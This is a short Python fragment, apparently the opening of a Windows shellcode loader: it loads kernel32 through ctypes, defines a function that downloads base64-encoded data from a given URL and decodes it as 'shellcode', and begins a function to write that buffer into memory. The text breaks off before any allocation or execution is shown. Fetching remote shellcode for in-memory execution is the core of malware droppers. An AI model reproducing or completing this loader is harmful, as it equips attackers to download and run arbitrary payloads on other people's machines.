from urllib import request

import base64
import ctypes

kernel32 = ctypes.windll.kernel32

def get_core(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode

def write_memory(buf):
    length = len(buf)